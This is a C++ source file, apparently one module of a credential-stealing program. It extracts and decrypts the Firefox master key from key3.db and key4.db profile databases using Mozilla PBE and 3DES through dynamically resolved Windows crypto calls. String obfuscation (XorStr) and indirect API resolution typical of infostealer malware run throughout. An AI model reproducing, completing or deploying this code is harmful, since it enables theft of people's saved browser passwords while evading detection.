#include "Common.h"

void FireFoxBase::ArrayCopy(const vector<byte>& src, int sourceIndex, vector<byte>& dest, int destIndex, int length)
{
	while (length--) dest[destIndex++] = src[sourceIndex++];
}

int FireFoxBase::StringToInt(string str)
{
	int res = 0;
	for (int i = str.size() - 1; i >= 0; --i)
	{
		int temp = str[i] - '0';
		if (str[i] >= 'A' && str[i] <= 'F')
			temp = str[i] - 'A' + 10;
		res += temp * (1 << (4 * (str.size() - i - 1)));
	}
	return res;
}

vector<byte> FireFoxBase::ConvertHexStringToByteArray(string hexString)
{
	if (hexString.size() % 2 != 0)
		return vector<byte>();
	vector<byte> arr(hexString.size() / 2);
	for (int i = 0; i < arr.size(); ++i)
	{
		string s = hexString.substr(i * 2, 2);
		arr[i] = StringToInt(s);
	}
	return arr;
}

vector<byte> FireFoxBase::ExtractPrivateKey3(string file)
{
	vector<byte> arr(24);
	Asn1Der asn1Der;

	bool b;
	BerkeleyDB berkeleyDB(file, b);
	if (!b)
		return vector<byte>();

	PasswordCheck passwordCheck(berkeleyDB.FindValue(XorStr("password-check")));
	string hexString = berkeleyDB.FindValue(XorStr("global-salt"));
	MozillaPBE pbe(ConvertHexStringToByteArray(hexString), vector<byte>(), ConvertHexStringToByteArray(passwordCheck.EntrySalt));
	pbe.Compute();
	string ps = TripleDesDecrypt(pbe.Key, pbe.IV, ConvertHexStringToByteArray(passwordCheck.Passwordcheck));
	if (ps == XorStr("password-check"))
	{
		string hexString2 = berkeleyDB.FindValue((byte*)MagicNumber1, 16);
		Asn1DerObject asn1DerObject = asn1Der.Parse(ConvertHexStringToByteArray(hexString2));
		pbe = MozillaPBE(ConvertHexStringToByteArray(hexString),
			vector<byte>(), asn1DerObject.objects[0].objects[0].objects[1].objects[0].Data);
		pbe.Compute();
		vector<byte> bytes;
		string ssbytes = TripleDesDecrypt(pbe.Key, pbe.IV, asn1DerObject.objects[0].objects[1].Data);
		for (size_t i = 0; i < ssbytes.size(); ++i)
			bytes.push_back(ssbytes[i]);
		Asn1DerObject asn1DerObject3 = asn1Der.Parse(asn1Der.Parse(bytes).objects[0].objects[2].Data);
		if (asn1DerObject3.objects[0].objects[3].Data.size() > 24)
			ArrayCopy(asn1DerObject3.objects[0].objects[3].Data, asn1DerObject3.objects[0].objects[3].Data.size() - 24, arr, 0, 24);
		else
			arr = asn1DerObject3.objects[0].objects[3].Data;
	}
	return arr;
}

vector<byte> FireFoxBase::ExtractPrivateKey4(string file)
{
	vector<byte> arr;
	bool b;
	SqlHandler sql(file, b);
	if (sql.ReadTable(XorStr("metaData")) && b)
	{
		string value, value2;
		int rowCount = sql.GetRowCount();
		if (rowCount == 0) return vector<byte>();
		for (int i = 0; i < rowCount; ++i)
		{
			if (sql.GetValue(i, 0) == XorStr("password"))
			{
				value = sql.GetValue(i, 1);
				value2 = sql.GetValue(i, 2);
				break;
			}
		}

		vector<byte> bt;
		for (char& ch : value2)
			bt.push_back(ch);
		Asn1Der asn1;
		Asn1DerObject asn1DerObject = asn1.Parse(bt);
		vector<byte> data = asn1DerObject.objects[0].objects[0].objects[1].objects[0].Data;
		vector<byte> data2 = asn1DerObject.objects[0].objects[1].Data;
		bt.clear();
		for (char& ch : value)
			bt.push_back(ch);
		MozillaPBE pbe(bt, vector<byte>(), data);
		pbe.Compute();
		string input = TripleDesDecrypt(pbe.Key, pbe.IV, data2);
		if (input == XorStr("password-check"))
		{
			if (sql.ReadTable(XorStr("nssPrivate")))
			{
				rowCount = sql.GetRowCount();
				if (rowCount != 65536)
				{
					string s;
					for (int i = 0; i < rowCount; ++i)
					{
						const string value = sql.GetValue(i, 23);
						if (!value.empty())
						{
							bt.clear();
							for (char ch : value)
								bt.push_back(ch);
							if (bt.size() == 16 && bt[0] == 248 && bt[bt.size() - 1] == 1)
							{
								s = sql.GetValue(i, 6);
								break;
							}
						}
					}
					bt.clear();
					for (char& ch : s)
						bt.push_back(ch);
					Asn1DerObject asn1DerObject2 = Asn1Der().Parse(bt);
					data = asn1DerObject2.objects[0].objects[0].objects[1].objects[0].Data;
					data2 = asn1DerObject2.objects[0].objects[1].Data;

					bt.clear();
					for (char& ch : value)
						bt.push_back(ch);
					pbe = MozillaPBE(bt, vector<byte>(), data);
					pbe.Compute();

					if (pbe.Key.size() == 0)
					{
						return arr;
					}

					string res = TripleDesDecrypt(pbe.Key, pbe.IV, data2);
					for (size_t i = 0; i < res.size(); ++i)
						arr.push_back(res[i]);
					return arr;
				}
			}
		}
	}

	return vector<byte>();
}

string FireFoxBase::TripleDesDecrypt(const vector<byte>& key, const vector<byte>& iv, const vector<byte>& input)
{
	HCRYPTPROV hProv;
	if (API(ADVAPI32, CryptAcquireContextA)(&hProv, NULL, NULL, PROV_RSA_SCHANNEL, CRYPT_VERIFYCONTEXT))
	{
		HCRYPTKEY hKey;
		typedef struct
		{
			BLOBHEADER hdr;
			DWORD cbKeySize;
			BYTE rgbKeyData[24];
		} KEYBLOB;
		KEYBLOB keyBlob;
		memset(&keyBlob, 0, sizeof(keyBlob));
		keyBlob.cbKeySize = 24;
		keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
		keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
		keyBlob.hdr.aiKeyAlg = CALG_3DES;
		memcpy(keyBlob.rgbKeyData, key.data(), 24);
		string res;
		if (API(ADVAPI32, CryptImportKey)(hProv, (const BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey))
		{
			DWORD dwMode = CRYPT_MODE_CBC;
			if (API(ADVAPI32, CryptSetKeyParam)(hKey, KP_MODE, (BYTE*)&dwMode, 0))
			{
				if (API(ADVAPI32, CryptSetKeyParam)(hKey, KP_IV, (BYTE*)iv.data(), 0))
				{
					vector<byte> dup = input;
					DWORD len = dup.size();
					if (API(ADVAPI32, CryptDecrypt)(hKey, NULL, TRUE, 0, (BYTE*)dup.data(), &len))
					{
						for (size_t i = 0; i < len; ++i)
							res += dup[i];
						API(ADVAPI32, CryptDestroyKey)(hKey);
					}
				}
			}
		}
		API(ADVAPI32, CryptDestroyKey)(hKey);
		API(ADVAPI32, CryptReleaseContext)(hProv, 0);
		API(ADVAPI32, CryptReleaseContext)(hProv, 0);
		return res;
	}

	return string();
}
